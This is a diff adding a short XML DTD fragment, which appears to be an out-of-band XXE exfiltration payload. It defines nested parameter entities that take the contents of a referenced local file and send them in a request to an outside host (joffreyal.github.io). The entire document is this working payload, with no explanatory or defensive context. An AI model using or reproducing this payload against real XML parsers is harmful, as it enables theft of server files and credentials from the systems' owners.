@@ -1,0 +1,4 @@
+<!ENTITY % all
+"<!ENTITY &#x25; send SYSTEM 'https://joffreyal.github.io/?%file;'>"
+>
+%all;
